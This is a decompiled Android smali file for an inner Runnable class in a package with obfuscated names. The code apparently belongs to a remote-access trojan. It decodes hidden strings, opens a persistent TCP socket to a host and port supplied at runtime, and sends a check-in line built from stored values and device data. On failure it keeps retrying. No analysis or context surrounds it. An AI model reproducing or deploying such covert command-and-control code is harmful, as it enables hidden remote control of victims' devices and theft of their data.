.class Lcmf0/c3b5bm90zq/patch/C5$1;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcmf0/c3b5bm90zq/patch/C5;->a(Ljava/lang/String;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:I

.field final synthetic c:Lcmf0/c3b5bm90zq/patch/C5;


# direct methods
.method constructor <init>(Lcmf0/c3b5bm90zq/patch/C5;Ljava/lang/String;I)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    iput-object p2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->a:Ljava/lang/String;

    iput p3, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->b:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    :cond_0
    :try_start_0
    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-virtual {v1}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v4, 0x59

    invoke-static {v2, v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    if-ne v0, v1, :cond_1

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-virtual {v0}, Lcmf0/c3b5bm90zq/patch/C5;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v1, 0x7f0c0025

    invoke-virtual {v0, v1}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_1
    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-virtual {v1}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v2, v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :goto_0
    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-virtual {v2}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v5, 0x56

    invoke-static {v3, v4, v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    if-ne v1, v2, :cond_2

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-virtual {v1}, Lcmf0/c3b5bm90zq/patch/C5;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v2, 0x7f0c0023

    invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    goto :goto_1

    :cond_2
    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-virtual {v2}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v3, v4, v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    :goto_1
    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->a:Ljava/lang/String;

    invoke-static {v2}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v2

    new-instance v3, Ljava/net/InetSocketAddress;

    iget v4, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->b:I

    invoke-direct {v3, v2, v4}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    new-instance v2, Ljava/net/Socket;

    invoke-direct {v2}, Ljava/net/Socket;-><init>()V

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C5;->a(Ljava/net/Socket;)Ljava/net/Socket;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v2

    const v4, 0xea5f

    invoke-virtual {v2, v3, v4}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v3

    invoke-virtual {v3}, Ljava/net/Socket;->isConnected()Z

    move-result v3

    iput-boolean v3, v2, Lcmf0/c3b5bm90zq/patch/C5;->l:Z

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    iget-boolean v2, v2, Lcmf0/c3b5bm90zq/patch/C5;->l:Z

    const/4 v3, 0x1

    if-ne v2, v3, :cond_3

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v2, v3}, Lcmf0/c3b5bm90zq/patch/C5;->a(Lcmf0/c3b5bm90zq/patch/C5;Z)Z

    new-instance v2, Lcmf0/c3b5bm90zq/patch/C5$a;

    iget-object v4, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    const/4 v5, 0x0

    invoke-direct {v2, v4, v5}, Lcmf0/c3b5bm90zq/patch/C5$a;-><init>(Lcmf0/c3b5bm90zq/patch/C5;Lcmf0/c3b5bm90zq/patch/C5$1;)V

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Object;

    invoke-virtual {v2, v4}, Lcmf0/c3b5bm90zq/patch/C5$a;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/net/Socket;->setTcpNoDelay(Z)V

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/net/Socket;->setKeepAlive(Z)V

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v2

    const/16 v3, 0x3ff

    invoke-virtual {v2, v3}, Ljava/net/Socket;->setSendBufferSize(I)V

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/net/Socket;->setReceiveBufferSize(I)V

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v3

    invoke-virtual {v3}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-static {v2, v3}, Lcmf0/c3b5bm90zq/patch/C5;->a(Lcmf0/c3b5bm90zq/patch/C5;Ljava/io/OutputStream;)Ljava/io/OutputStream;

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v4, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v6, 0x46

    invoke-static {v4, v5, v6, v7}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-virtual {v1}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcmf0/c3b5bm90zq/patch/a;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcmf0/c3b5bm90zq/patch/C5;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C5;->a(Lcmf0/c3b5bm90zq/patch/C5;)V

    :cond_3
    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5$1;->c:Lcmf0/c3b5bm90zq/patch/C5;

    iget-boolean v0, v0, Lcmf0/c3b5bm90zq/patch/C5;->l:Z

    if-eqz v0, :cond_0

    :goto_2
    return-void
.end method
